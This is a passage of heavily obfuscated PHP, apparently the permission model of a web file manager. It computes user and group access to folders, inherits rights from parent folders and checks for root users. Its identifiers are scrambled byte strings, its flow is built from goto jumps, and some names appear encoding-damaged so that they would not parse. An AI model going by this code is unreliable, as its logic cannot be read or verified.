$this->field($f‡ëŠğ°©‰[369])->group($f‡ëŠğ°©‰[369])->select(); $B¹¢º„õË = array_to_keyvalue($B¹¢º„õË, $f‡ëŠğ°©‰[33], $f‡ëŠğ°©‰[369]); goto EŒ‹±™Š‘; Dô¯Ó”•ĞÈ: } private function sourceListAuth($d¦…µñš·) { goto aÍÁŒ×’; F‡š–¢Ú™Ò: $e”«Óì·‚† = $this->field($a„†…ù÷Ó)->where(array($aÌëËŞÈÖ¨[369] => array($aÌëËŞÈÖ¨[7], $d¦…µñš·)))->select(); $Eß‘¶Ññ‡ò = array_to_keyvalue_group($e”«Óì·‚†, $aÌëËŞÈÖ¨[369]); $a­ƒŸãŠ… = array(); goto BÜ«‹Î·ÊØ; a‘øŠ§½©: return $a­ƒŸãŠ…; goto a¿ØïÜÍŠ”; BÜ«‹Î·ÊØ: $Bî‚ÄöôÈÕ = array(); foreach ($D¶‰ÌŠç¬œ as $b‡ÕĞ¬›‰®) { goto bœê¯‰½æ®; E’îšÔ•†Ñ: unset($b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[391]]); $e­æáçœÎ = $Eß‘¶Ññ‡ò[$b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[369]]]; if (!$e­æáçœÎ) { continue; } goto A¤ÁÖ¦ÓÁ; bœê¯‰½æ®: unset($b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[379]]); unset($b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[378]]); unset($b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[376]]); goto E’îšÔ•†Ñ; A¤ÁÖ¦ÓÁ: $b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[2278]] = $this->authTargetInfo($e­æáçœÎ); $b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[468]] = rtrim($b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[464]], $aÌëËŞÈÖ¨[8]) . $aÌëËŞÈÖ¨[8] . ltrim($b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[468]], $aÌëËŞÈÖ¨[8]); $a­ƒŸãŠ…[] = $b‡ÕĞ¬›‰®; goto e‘Ú¨ØÈ¿—; e‘Ú¨ØÈ¿—: $B¥ÇÉµĞñ = count(explode($aÌëËŞÈÖ¨[8], trim($b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[468]], $aÌëËŞÈÖ¨[8]))); $Bî‚ÄöôÈÕ[] = $B¥ÇÉµĞñ + ($b‡ÕĞ¬›‰®[$aÌëËŞÈÖ¨[29]] == $aÌëËŞÈÖ¨[76] ? 0 : 1000); goto BË±¿íø¡æ; BË±¿íø¡æ: } array_multisort($Bî‚ÄöôÈÕ, SORT_ASC, $a­ƒŸãŠ…); goto a‘øŠ§½©; aÍÁŒ×’: $aÌëËŞÈÖ¨ =& $_SERVER[¦·]; $D¶‰ÌŠç¬œ = Model($aÌëËŞÈÖ¨[1122])->sourceListInfo($d¦…µñš·, !0); $a„†…ù÷Ó = $aÌëËŞÈÖ¨[2274]; goto F‡š–¢Ú™Ò; a¿ØïÜÍŠ”: } private function groupChidldAllRootSource($dŠ‹©Èî) { $fÚõ˜áÚÌ‰ =& $_SERVER[¦·]; $BÚÙ¤¶‡‡ß = Model($fÚõ˜áÚÌ‰[2279])->groupChildrenAll($dŠ‹©Èî); $c±šÔÕåÑ = array($fÚõ˜áÚÌ‰[463] => 0, $fÚõ˜áÚÌ‰[458] => array($fÚõ˜áÚÌ‰[7], $BÚÙ¤¶‡‡ß), $fÚõ˜áÚÌ‰[371] => SourceModel::TYPE_GROUP); $a›Ÿ¦ÒÀâÛ = Model($fÚõ˜áÚÌ‰[753])->field($fÚõ˜áÚÌ‰[369])->where($c±šÔÕåÑ)->select(); $a›Ÿ¦ÒÀâÛ = array_to_keyvalue($a›Ÿ¦ÒÀâÛ, $fÚõ˜áÚÌ‰[33], $fÚõ˜áÚÌ‰[369]); return $a›Ÿ¦ÒÀâÛ; } private function authTargetInfo($Eºà­ªÕ‘Ê) { goto b¥ğïîöÉÁ; e¶¥ÀÖ©ºá: return $Fğ¿Ûˆ”Ê; goto d‡äŠ¼£Ö…; b¥ğïîöÉÁ: $c«ÂŞ”ô”Œ =& $_SERVER[¦·]; $Fğ¿Ûˆ”Ê = array(); $bÑõ¾Š›Ã¢ = array(); goto C¼£‹ôË‰ˆ; C¼£‹ôË‰ˆ: $dØ¯ÓùÛè† = 2 << 25; foreach ($Eºà­ªÕ‘Ê as $Eç’ÔÂØÅ) { goto f›Š‰¨í¼; f›Š‰¨í¼: $fË¢àÆò… = Model($c«ÂŞ”ô”Œ[2275])->listData($Eç’ÔÂØÅ[$c«ÂŞ”ô”Œ[2256]]); if (!$fË¢àÆò…) { continue; } if ($Eç’ÔÂØÅ[$c«ÂŞ”ô”Œ[371]] == SourceModel::TYPE_USER) { $a˜Ä¹©™ = Model($c«ÂŞ”ô”Œ[476])->getInfoSimpleOuter($Eç’ÔÂØÅ[$c«ÂŞ”ô”Œ[458]]); if ($a˜Ä¹©™[$c«ÂŞ”ô”Œ[1441]] == $c«ÂŞ”ô”Œ[1034]) { continue; } if ($a˜Ä¹©™[$c«ÂŞ”ô”Œ[1441]] == $c«ÂŞ”ô”Œ[470]) { $a˜Ä¹©™[$c«ÂŞ”ô”Œ[28]] = LNG($c«ÂŞ”ô”Œ[2280]); } } else { $a˜Ä¹©™ = Model($c«ÂŞ”ô”Œ[460])->getInfoSimple($Eç’ÔÂØÅ[$c«ÂŞ”ô”Œ[458]]); } goto f¸îÛœôŸ†; f¸îÛœôŸ†: if (!$a˜Ä¹©™) { continue; } $a˜Ä¹©™[$c«ÂŞ”ô”Œ[418]] = $fË¢àÆò…; $Fğ¿Ûˆ”Ê[] = $a˜Ä¹©™; goto aÔè…£öÍ; b‚Óè×¿¸è: if ($Eç’ÔÂØÅ[$c«ÂŞ”ô”Œ[371]] == SourceModel::TYPE_USER && $Eç’ÔÂØÅ[$c«ÂŞ”ô”Œ[458]] == $c«ÂŞ”ô”Œ[470]) { $B×·Ñ“÷àµ = 0; } $bÑõ¾Š›Ã¢[] = $fË¢àÆò…[$c«ÂŞ”ô”Œ[376]] + $B×·Ñ“÷àµ; goto f»é‡Ã¶Í; aÔè…£öÍ: $B×·Ñ“÷àµ = 0; if ($Eç’ÔÂØÅ[$c«ÂŞ”ô”Œ[371]] == SourceModel::TYPE_GROUP) { $B×·Ñ“÷àµ = $dØ¯ÓùÛè† * 2; } if ($Eç’ÔÂØÅ[$c«ÂŞ”ô”Œ[371]] == SourceModel::TYPE_USER) { $B×·Ñ“÷àµ = $dØ¯ÓùÛè†; } goto b‚Óè×¿¸è; f»é‡Ã¶Í: } array_multisort($bÑõ¾Š›Ã¢, SORT_DESC, $Fğ¿Ûˆ”Ê); goto e¶¥ÀÖ©ºá; d‡äŠ¼£Ö…: } public function getAllChildrenByUser($CÎ¦ËÏÓ¦¯, $B•êÑ÷§Ù) { goto bÅŒŠ…¢ˆá; eš°Á·«µ›: if ($aÅ…¡†³É[$Fèì²‘éŞ˜[463]] == $Fèì²‘éŞ˜[470] && $aÅ…¡†³É[$Fèì²‘éŞ˜[458]] != $Fº‰Æ±Æ && $this->groupContainUser($aÅ…¡†³É[$Fèì²‘éŞ˜[458]], $B•êÑ÷§Ù)) { foreach ($fÁŠ†í‡õ[$Fèì²‘éŞ˜[2281]] as $aî¾‘öòç) { $f¤øª‡‘ • = Model($Fèì²‘éŞ˜[460])->getInfo($aî¾‘öòç[$Fèì²‘éŞ˜[2112]]); $f«ßÍÆÓ = Model($Fèì²‘éŞ˜[479])->getInfoSimpleOuter($B•êÑ÷§Ù); $f«ßÍÆÓ[$Fèì²‘éŞ˜[418]] = $aî¾‘öòç[$Fèì²‘éŞ˜[376]]; if (Model($Fèì²‘éŞ˜[2275])->authCheckAction($aî¾‘öòç[$Fèì²‘éŞ˜[376]][$Fèì²‘éŞ˜[376]], $Fèì²‘éŞ˜[1567])) { continue; } $DŒ°Ô°•í = array($Fèì²‘éŞ˜[28] => $Fèì²‘éŞ˜[1394] . $f¤øª‡‘ •[$Fèì²‘éŞ˜[28]], $Fèì²‘éŞ˜[369] => $f¤øª‡‘ •[$Fèì²‘éŞ˜[391]][$Fèì²‘éŞ˜[369]], $Fèì²‘éŞ˜[75] => KodIO::make($f¤øª‡‘ •[$Fèì²‘éŞ˜[391]][$Fèì²‘éŞ˜[369]]), $Fèì²‘éŞ˜[463] => $Fèì²‘éŞ˜[470], $Fèì²‘éŞ˜[371] => $Fèì²‘éŞ˜[973], $Fèì²‘éŞ˜[29] => $Fèì²‘éŞ˜[490], $Fèì²‘éŞ˜[468] => $f¤øª‡‘ •[$Fèì²‘éŞ˜[465]], $Fèì²‘éŞ˜[2112] => $f¤øª‡‘ •[$Fèì²‘éŞ˜[2112]], $Fèì²‘éŞ˜[462] => $f¤øª‡‘ •[$Fèì²‘éŞ˜[463]], $Fèì²‘éŞ˜[2278] => array($f«ßÍÆÓ)); $dİÙà’¯ƒ[$DŒ°Ô°•í[$Fèì²‘éŞ˜[369]]] = $DŒ°Ô°•í; } } $A’ùÎóîÎÒ = array(); $d”¦¹õÌçå = $this->getAllChildren($CÎ¦ËÏÓ¦¯); goto E‰¯³ÂŠ«; cÓ³•¶å·«: $aÅ…¡†³É = Model($Fèì²‘éŞ˜[1122])->sourceInfo($CÎ¦ËÏÓ¦¯); $dİÙà’¯ƒ = array(); $Fº‰Æ±Æ = 1; goto eš°Á·«µ›; A´„ŒÛÌèˆ: return $A’ùÎóîÎÒ; goto Eá›‡Ô›³; bÅŒŠ…¢ˆá: $Fèì²‘éŞ˜ =& $_SERVER[¦·]; $fÁŠ†í‡õ = Model($Fèì²‘éŞ˜[479])->getInfo($B•êÑ÷§Ù); if (!$B•êÑ÷§Ù || !$CÎ¦ËÏÓ¦¯ || !$fÁŠ†í‡õ) { return array(); } goto cÓ³•¶å·«; E‰¯³ÂŠ«: foreach ($d”¦¹õÌçå as $FåÃ„ õÙ) { $aÃ—ß…—ÔÇ = !1; foreach ($FåÃ„ õÙ[$Fèì²‘éŞ˜[2278]] as $bõâ»¶•Ô¿) { if ($bõâ»¶•Ô¿[$Fèì²‘éŞ˜[1441]]) { if ($bõâ»¶•Ô¿[$Fèì²‘éŞ˜[1441]] == $B•êÑ÷§Ù) { $aÃ—ß…—ÔÇ = !0; break; } } if ($bõâ»¶•Ô¿[$Fèì²‘éŞ˜[2112]]) { if ($this->groupContainUser($bõâ»¶•Ô¿[$Fèì²‘éŞ˜[2112]], $B•êÑ÷§Ù)) { $aÃ—ß…—ÔÇ = !0; break; } } } if ($aÃ—ß…—ÔÇ) { $A’ùÎóîÎÒ[] = $FåÃ„ õÙ; } $E ‰º´íÚƒ = $FåÃ„ õÙ[$Fèì²‘éŞ˜[369]]; if (isset($dİÙà’¯ƒ[$E ‰º´íÚƒ])) { $FåÃ„ õÙ[$Fèì²‘éŞ˜[2278]][] = $dİÙà’¯ƒ[$E ‰º´íÚƒ][0]; $dİÙà’¯ƒ[$E ‰º´íÚƒ] = !1; } } $dİÙà’¯ƒ = array_filter(array_values($dİÙà’¯ƒ)); $A’ùÎóîÎÒ = array_merge($dİÙà’¯ƒ, $A’ùÎóîÎÒ); goto A´„ŒÛÌèˆ; Eá›‡Ô›³: } public function setAllChildrenByUser($fˆ¡ÚÖå°î, $a»ØÉÛ«ğ, $B£ƒŞŞ³“¥) { $f¦ÌÅ®•—÷ =& $_SERVER[¦·]; $FÑİ®ÌØİã = $this->getAllChildrenByUser($fˆ¡ÚÖå°î, $a»ØÉÛ«ğ); if (!$B£ƒŞŞ³“¥ || !$FÑİ®ÌØİã) { return !1; } foreach ($FÑİ®ÌØİã as $bíË–ÛŠ) { $A…¶Ğñ½Íš = array(); foreach ($bíË–ÛŠ[$f¦ÌÅ®•—÷[2278]] as $aœõ™ä¤Ğ©) { $aÅŸè«ÈÂ = $aœõ™ä¤Ğ©[$f¦ÌÅ®•—÷[418]]; $Cİù†ÓÀÈ = $aœõ™ä¤Ğ©[$f¦ÌÅ®•—÷[1441]] ? SourceModel::TYPE_USER : SourceModel::TYPE_GROUP; $c‚µğç¦•— = $aœõ™ä¤Ğ©[$f¦ÌÅ®•—÷[1441]] ? $aœõ™ä¤Ğ©[$f¦ÌÅ®•—÷[1441]] : $aœõ™ä¤Ğ©[$f¦ÌÅ®•—÷[2112]]; if ($aœõ™ä¤Ğ©[$f¦ÌÅ®•—÷[1441]] && $aœõ™ä¤Ğ©[$f¦ÌÅ®•—÷[1441]] == $a»ØÉÛ«ğ) { continue; } $A…¶Ğñ½Íš[] = array($f¦ÌÅ®•—÷[369] => $bíË–ÛŠ[$f¦ÌÅ®•—÷[369]], $f¦ÌÅ®•—÷[371] => $Cİù†ÓÀÈ, $f¦ÌÅ®•—÷[458] => intval($c‚µğç¦•—), $f¦ÌÅ®•—÷[2256] => isset($aÅŸè«ÈÂ[$f¦ÌÅ®•—÷[367]]) ? intval($aÅŸè«ÈÂ[$f¦ÌÅ®•—÷[367]]) : 0, $f¦ÌÅ®•—÷[2257] => isset($aÅŸè«ÈÂ[$f¦ÌÅ®•—÷[2257]]) ? intval($aÅŸè«ÈÂ[$f¦ÌÅ®•—÷[2257]]) : -1); } $A…¶Ğñ½Íš[] = array($f¦ÌÅ®•—÷[369] => $bíË–ÛŠ[$f¦ÌÅ®•—÷[369]], $f¦ÌÅ®•—÷[371] => SourceModel::TYPE_USER, $f¦ÌÅ®•—÷[458] => intval($a»ØÉÛ«ğ), $f¦ÌÅ®•—÷[2256] => intval($B£ƒŞŞ³“¥), $f¦ÌÅ®•—÷[2257] => -1); $this->where(array($f¦ÌÅ®•—÷[383] => $bíË–ÛŠ[$f¦ÌÅ®•—÷[369]]))->delete(); $this->addAll($A…¶Ğñ½Íš); } return !0; } public function get($a‹˜ËÜÇòç) { $C³Â£ğÚì† = $this->getSourceList(array($a‹˜ËÜÇòç), !0); return $C³Â£ğÚì†[0]; } public function getSourceList($CÁ¾„ñÆ„, $D«£‚çæ¯· = false, $dĞØ‰É•“ù = false) { goto EÖ´ä å; fãÀ©êŠÆÖ: $f¡Š¸Êºñğ = $bóÆ² ‡‰¼[2283]; $E”½Ò‘Û¨® = array($bóÆ² ‡‰¼[383] => array($bóÆ² ‡‰¼[384], $Eí¯¶Æ‘ğ )); $d‘ã·ŒªŒ = $this->field($f¡Š¸Êºñğ)->where($E”½Ò‘Û¨®)->select(); goto CÛ”Æ½ŒŠ; CÛ”Æ½ŒŠ: $d‘ã·ŒªŒ = array_to_keyvalue_group($d‘ã·ŒªŒ, $bóÆ² ‡‰¼[369]); $Dó‹ßÅª¿ = array(); foreach ($Eí¯¶Æ‘ğ  as $fÖŒ×ÆÏÃ¾) { if (isset($d‘ã·ŒªŒ[$fÖŒ×ÆÏÃ¾])) { $Dó‹ßÅª¿[$fÖŒ×ÆÏÃ¾] = $d‘ã·ŒªŒ[$fÖŒ×ÆÏÃ¾]; } } goto A´˜ËßËØ; A´˜ËßËØ: $fŒŸÒã®À = $this->userIsRoot($dĞØ‰É•“ù); $C¡±˜ö…èŠ = AuthModel::authAll(); $CÆ²‚¿¤¿± = array($bóÆ² ‡‰¼[377] => $C¡±˜ö…èŠ, $bóÆ² ‡‰¼[2284] => array($bóÆ² ‡‰¼[385] => 0, $bóÆ² ‡‰¼[2118] => $C¡±˜ö…èŠ, $bóÆ² ‡‰¼[386] => LNG($bóÆ² ‡‰¼[2285]), $bóÆ² ‡‰¼[2131] => $bóÆ² ‡‰¼[2286])); goto FñéÏğ‡; f‹ÆŠÛ±«à: if (!$D«£‚çæ¯· && count($CÁ¾„ñÆ„) == 1) { $D«£‚çæ¯· = array(); $D«£‚çæ¯·[$CÁ¾„ñÆ„[0]] = $C˜õ÷ŸéÒ->sourceInfo($CÁ¾„ñÆ„[0]); } if (!$D«£‚çæ¯·) { $E”½Ò‘Û¨® = array($bóÆ² ‡‰¼[383] => array($bóÆ² ‡‰¼[384], $CÁ¾„ñÆ„)); $D«£‚çæ¯· = $C˜õ÷ŸéÒ->field($bóÆ² ‡‰¼[2282])->where($E”½Ò‘Û¨®)->select(); $D«£‚çæ¯· = array_to_keyvalue($D«£‚çæ¯·, $bóÆ² ‡‰¼[369]); } $Eí¯¶Æ‘ğ  = $CÁ¾„ñÆ„; goto cµ¦šÈÏ±»; FñéÏğ‡: $B²÷ø„Šæƒ = array(); foreach ($D«£‚çæ¯· as $fÖŒ×ÆÏÃ¾ => $E¯ˆØÂ›Íø) { if ($fŒŸÒã®À) { $B²÷ø„Šæƒ[$fÖŒ×ÆÏÃ¾] = $CÆ²‚¿¤¿±; continue; } $B²÷ø„Šæƒ[$fÖŒ×ÆÏÃ¾] = $this->makeSourceAuth($E¯ˆØÂ›Íø, $Dó‹ßÅª¿, $dĞØ‰É•“ù); } return $B²÷ø„Šæƒ; goto CÕšÇÓŠ—; EÖ´ä å: $bóÆ² ‡‰¼ =& $_SERVER[¦·]; if (!$CÁ¾„ñÆ„) { return array(); } $C˜õ÷ŸéÒ = Model($bóÆ² ‡‰¼[1122]); goto f‹ÆŠÛ±«à; cµ¦šÈÏ±»: foreach ($D«£‚çæ¯· as $EÀÉ©‰äì¤ => $bœ”ÒŠŠŠ) { $eµ‚æí³è¿ = $C˜õ÷ŸéÒ->parentLevelArray($bœ”ÒŠŠŠ[$bóÆ² ‡‰¼[461]]); $Eí¯¶Æ‘ğ  = array_merge($Eí¯¶Æ‘ğ , array($EÀÉ©‰äì¤), array_reverse($eµ‚æí³è¿)); } $Eí¯¶Æ‘ğ  = array_values(array_unique($Eí¯¶Æ‘ğ )); if (!$Eí¯¶Æ‘ğ ) { return array(); } goto fãÀ©êŠÆÖ; CÕšÇÓŠ—: } public function authDeepCheck($e‹¦Ğ¸¡Ü½, $c–ñ’ÜÃå = false) { goto DÉÛ²´ëËï; DÉÛ²´ëËï: $FßÇ‡‘á´¡ =& $_SERVER[¦·]; $c–ñ’ÜÃå = $c–ñ’ÜÃå ? $c–ñ’ÜÃå : USER_ID; $dğƒàŒ‚©œ = $this->makeAuthDeep($c–ñ’ÜÃå); goto E‰îñÖÚË; a÷–„½åƒ„: $D’‡Í¯øõ© = $F™‡„³“¦ ? $F™‡„³“¦[0] : $e‹¦Ğ¸¡Ü½; return array($FßÇ‡‘á´¡[377] => -1, $FßÇ‡‘á´¡[418] => array($FßÇ‡‘á´¡[385] => $FßÇ‡‘á´¡[1034], $FßÇ‡‘á´¡[2118] => $FßÇ‡‘á´¡[470], $FßÇ‡‘á´¡[386] => LNG($FßÇ‡‘á´¡[2289]), $FßÇ‡‘á´¡[2131] => $FßÇ‡‘á´¡[2290]), $FßÇ‡‘á´¡[2291] => LNG($FßÇ‡‘á´¡[2292]), $FßÇ‡‘á´¡[2293] => $this->sourceAuthInfo($D’‡Í¯øõ©)); goto fæŠçœ¿ÂÁ; E‰îñÖÚË: if (!in_array($e‹¦Ğ¸¡Ü½, $dğƒàŒ‚©œ[$FßÇ‡‘á´¡[2287]])) { return !1; } $F™‡„³“¦ = array(); foreach ($dğƒàŒ‚©œ[$FßÇ‡‘á´¡[2288]] as $CàÛëëßö => $F¨›‘¸­) { if (!in_array($e‹¦Ğ¸¡Ü½, $F¨›‘¸­)) { continue; } $F™‡„³“¦[] = $CàÛëëßö; } goto a÷–„½åƒ„; fæŠçœ¿ÂÁ: } protected function makeAuthDeep($Cæïâ¡ÊÍ¨ = false) { goto DàÌ‡ÊÄ½; c˜¡Í‘ÖÁ•: if ($eÈéÀµÜÈ©) { $eÌ¶°¯ìõˆ = $bÆÉ÷ÀÄ¢Ş->where(array($bÙ‚ªİÂ†í[369] => array($bÙ‚ªİÂ†í[384], $eÈéÀµÜÈ©)))->select(); foreach ($eÌ¶°¯ìõˆ as $D»±Ğ¥Œğ) { $d™ãÅâ™ = $bÆÉ÷ÀÄ¢Ş->parentLevelArray($D»±Ğ¥Œğ[$bÙ‚ªİÂ†í[461]]); $Dœëªè¿¹ = array_merge($Dœëªè¿¹, $d™ãÅâ™); $eë°ĞÈã£ñ[] = $D»±Ğ¥Œğ[$bÙ‚ªİÂ†í[458]]; $Cöø±…ÓÃç[$D»±Ğ¥Œğ[$bÙ‚ªİÂ†í[369]]] = $d™ãÅâ™; $e²Œ÷ŠÀÜ²[$D»±Ğ¥Œğ[$bÙ‚ªİÂ†í[369]]] = $D»±Ğ¥Œğ[$bÙ‚ªİÂ†í[458]]; } } $eë°ĞÈã£ñ = array_values(array_unique($eë°ĞÈã£ñ)); $Bôô¯Ú‹Î† = $eë°ĞÈã£ñ; goto Aöº’Õ’š; DàÌ‡ÊÄ½: $bÙ‚ªİÂ†í =& $_SERVER[¦·]; static $C¢ìÚ‘¿“‡ = array(); $Cæïâ¡ÊÍ¨ = $Cæïâ¡ÊÍ¨ ? $Cæïâ¡ÊÍ¨ : USER_ID; goto EŸÒ¤¡·ŠÎ; Aöº’Õ’š: foreach ($Bôô¯Ú‹Î† as $DÍ¯Ãí‡³) { $EŒ²¬Îõ‰Œ = $E‡÷ñğ´Ó°->getInfo($DÍ¯Ãí‡³); $d™ãÅâ™ = $bÆÉ÷ÀÄ¢Ş->parentLevelArray($EŒ²¬Îõ‰Œ[$bÙ‚ªİÂ†í[461]]); $eë°ĞÈã£ñ = array_merge($eë°ĞÈã£ñ, $d™ãÅâ™); } $eë°ĞÈã£ñ = array_values(array_unique($eë°ĞÈã£ñ)); foreach ($eë°ĞÈã£ñ as $DÍ¯Ãí‡³) { $EŒ²¬Îõ‰Œ = $E‡÷ñğ´Ó°->getInfo($DÍ¯Ãí‡³); $Dœëªè¿¹[] = $EŒ²¬Îõ‰Œ[$bÙ‚ªİÂ†í[391]][$bÙ‚ªİÂ†í[369]]; $fòÊ“‡¯ÉÎ[$DÍ¯Ãí‡³] = $EŒ²¬Îõ‰Œ[$bÙ‚ªİÂ†í[391]][$bÙ‚ªİÂ†í[369]]; $A³›·‹‘„°[$DÍ¯Ãí‡³] = $bÆÉ÷ÀÄ¢Ş->parentLevelArray($EŒ²¬Îõ‰Œ[$bÙ‚ªİÂ†í[461]]); } goto eÒ¬± «ŠÑ; Cª¶ÇêÑ¾¿: $eÈéÀµÜÈ© = array_to_keyvalue($f°À–øõÅ¾, $bÙ‚ªİÂ†í[33], $bÙ‚ªİÂ†í[369]); $Dœëªè¿¹ = array(); $eë°ĞÈã£ñ = $bÍ¾¿¥‡ßÃ; goto CŞµ­ààŒ; eÒ¬± «ŠÑ: foreach ($Cöø±…ÓÃç as $Aå•¿ªšˆ => $F¡š·„´†À) { $dÏÖŒ‰‰ñµ = $e²Œ÷ŠÀÜ²[$Aå•¿ªšˆ]; if (!$dÏÖŒ‰‰ñµ || !$fòÊ“‡¯ÉÎ[$dÏÖŒ‰‰ñµ]) { continue; } $DÀ¤ºô¯„¸ = array(); foreach ($A³›·‹‘„°[$dÏÖŒ‰‰ñµ] as $DÍ¯Ãí‡³) { $DÀ¤ºô¯„¸[] = $fòÊ“‡¯ÉÎ[$DÍ¯Ãí‡³]; } $Cöø±…ÓÃç[$Aå•¿ªšˆ] = array_merge($DÀ¤ºô¯„¸, $F¡š·„´†À); } $Dœëªè¿¹ = array_values(array_unique($Dœëªè¿¹)); $FÃ×·Øõ¦ = array($bÙ‚ªİÂ†í[2287] => $Dœëªè¿¹, $bÙ‚ªİÂ†í[2288] => $Cöø±…ÓÃç); goto cá£¢­°„Å; fïÄµÕ³¯Ï: if ($bÍ¾¿¥‡ßÃ) { $Eİ„ŞƒÅó¸ = array(array($bÙ‚ªİÂ†í[371] => SourceModel::TYPE_USER, $bÙ‚ªİÂ†í[458] => $Cæïâ¡ÊÍ¨), array($bÙ‚ªİÂ†í[371] => SourceModel::TYPE_GROUP, $bÙ‚ªİÂ†í[458] => array($bÙ‚ªİÂ†í[384], $bÍ¾¿¥‡ßÃ)), $bÙ‚ªİÂ†í[916] => $bÙ‚ªİÂ†í[2197]); } if ($bŠ²á§ƒğ) { $Eİ„ŞƒÅó¸ = array($Eİ„ŞƒÅó¸, $bÙ‚ªİÂ†í[2256] => array($bÙ‚ªİÂ†í[2295], $bŠ²á§ƒğ)); } $f°À–øõÅ¾ = $this->field($bÙ‚ªİÂ†í[2296])->where($Eİ„ŞƒÅó¸)->select(); goto Cª¶ÇêÑ¾¿; CŞµ­ààŒ: $bÆÉ÷ÀÄ¢Ş = Model($bÙ‚ªİÂ†í[1122]); $E‡÷ñğ´Ó° = Model($bÙ‚ªİÂ†í[460]); $Cöø±…ÓÃç = array(); goto ağ°õÅ»¢; dœ¬í¾ÇÉ: foreach ($fõîÜ¿Á as $dê‰šïÑÛ) { if ($dê‰šïÑÛ[$bÙ‚ªİÂ†í[376]] == 0 && $dê‰šïÑÛ[$bÙ‚ªİÂ†í[2133]] == $bÙ‚ªİÂ†í[83]) { $bŠ²á§ƒğ[] = $dê‰šïÑÛ[$bÙ‚ªİÂ†í[367]]; } } $bÍ¾¿¥‡ßÃ = $this->userGroupParents($Cæïâ¡ÊÍ¨); $Eİ„ŞƒÅó¸ = array($bÙ‚ªİÂ†í[371] => SourceModel::TYPE_USER, $bÙ‚ªİÂ†í[458] => $Cæïâ¡ÊÍ¨); goto fïÄµÕ³¯Ï; EŸÒ¤¡·ŠÎ: if (isset($C¢ìÚ‘¿“‡[$Cæïâ¡ÊÍ¨])) { return $C¢ìÚ‘¿“‡[$Cæïâ¡ÊÍ¨]; } $fõîÜ¿Á = Model($bÙ‚ªİÂ†í[2294])->listData(); $bŠ²á§ƒğ = array(); goto dœ¬í¾ÇÉ; ağ°õÅ»¢: $e²Œ÷ŠÀÜ² = array(); $fòÊ“‡¯ÉÎ = array(); $A³›·‹‘„° = array(); goto c˜¡Í‘ÖÁ•; cá£¢­°„Å: $C¢ìÚ‘¿“‡[$Cæïâ¡ÊÍ¨] = $FÃ×·Øõ¦; return $FÃ×·Øõ¦; goto Eâ—éÜôòÊ; Eâ—éÜôòÊ: } private function makeSourceAuth($f÷Ù…¸Şø, $B¾÷Š²™˜Ì, $B­¿Í•¤ÆÏ = false) { goto F›´¢¯ô‚Á; F›´¢¯ô‚Á: $e¼Îá‡ÍÉ§ =& $_SERVER[¦·]; $C¡ˆÓ¼Ü = $e¼Îá‡ÍÉ§[83]; $cÏ¿Í«Ñƒ = $f÷Ù…¸Şø[$e¼Îá‡ÍÉ§[458]]; goto DŸõ¸äàÖ; d™ˆ¼Œß‡„: foreach ($aÏÊøö‘À as $AİùÚñââ) { if (!isset($B¾÷Š²™˜Ì[$AİùÚñââ])) { continue; } $Fî²ÌŞ›ñŸ = $this->authMake($B¾÷Š²™˜Ì[$AİùÚñââ], $B­¿Í•¤ÆÏ); if ($Fî²ÌŞ›ñŸ[$e¼Îá‡ÍÉ§[418]]) { $A£Ø’Ë÷„ = $Fî²ÌŞ›ñŸ; break; } } if (!$E›¼¡ëÇæ¥) { return $A£Ø’Ë÷„; } if (!$A£Ø’Ë÷„ && $D†ã¼Î™å) { $A£Ø’Ë÷„ = $this->groupAuthInfo($D†ã¼Î™å, $cÏ¿Í«Ñƒ); } goto CŠ–ÉÚŞ‘; E¦Åá¶ˆ¸: $aÏÊøö‘À = Model($e¼Îá‡ÍÉ§[1122])->parentLevelArray($f÷Ù…¸Şø[$e¼Îá‡ÍÉ§[461]]); $aÏÊøö‘À = array_merge(array($f÷Ù…¸Şø[$e¼Îá‡ÍÉ§[369]]), array_reverse($aÏÊøö‘À)); $A£Ø’Ë÷„ = !1; goto d™ˆ¼Œß‡„; CŠ–ÉÚŞ‘: if (!$A£Ø’Ë÷„) { $DˆçöõØóî = Model($e¼Îá‡ÍÉ§[460])->getInfo($cÏ¿Í«Ñƒ); $EŒ‚Èê½ÚĞ = explode($e¼Îá‡ÍÉ§[47], trim($DˆçöõØóî[$e¼Îá‡ÍÉ§[461]], $e¼Îá‡ÍÉ§[47])); foreach ($EŒ‚Èê½ÚĞ as $e´Ö¨ÂØÙÓ) { if ($e´Ö¨ÂØÙÓ == $e¼Îá‡ÍÉ§[470] || $e´Ö¨ÂØÙÓ == $C¡ˆÓ¼Ü) { continue; } $BõÔÜˆ¡™ = $this->groupRootAuth($e´Ö¨ÂØÙÓ, $B­¿Í•¤ÆÏ); if (!$BõÔÜˆ¡™) { continue; } $A£Ø’Ë÷„ = $this->groupAuthInfo($BõÔÜˆ¡™, $e´Ö¨ÂØÙÓ); break; } } if (!$A£Ø’Ë÷„ || $A£Ø’Ë÷„[$e¼Îá‡ÍÉ§[377]] <= 0) { $Bœ±øÊ˜ = $this->authDeepCheck($f÷Ù…¸Şø[$e¼Îá‡ÍÉ§[369]], $B­¿Í•¤ÆÏ); if ($Bœ±øÊ˜) { $A£Ø’Ë÷„ = $Bœ±øÊ˜; } } return $A£Ø’Ë÷„; goto fôÕîë¶Òà; DŸõ¸äàÖ: $E›¼¡ëÇæ¥ = $f÷Ù…¸Şø[$e¼Îá‡ÍÉ§[371]] == SourceModel::TYPE_GROUP; $D†ã¼Î™å = $E›¼¡ëÇæ¥ ? $this->groupRootAuth($cÏ¿Í«Ñƒ, $B­¿Í•¤ÆÏ) : !1; if ($D†ã¼Î™å && Model($e¼Îá‡ÍÉ§[2275])->authCheckAction($D†ã¼Î™å[$e¼Îá‡ÍÉ§[376]], $e¼Îá‡ÍÉ§[1567])) { return $this->groupAuthInfo($D†ã¼Î™å, $cÏ¿Í«Ñƒ); } goto E¦Åá¶ˆ¸; fôÕîë¶Òà: } private function userIsRoot($Dòõ÷­¨ğ = false) { $eˆåÀÄÛ¿Ø =& $_SERVER[¦·]; if (!$Dòõ÷­¨ğ && _get($GLOBALS, $eˆåÀÄÛ¿Ø[459])) { return !0; } 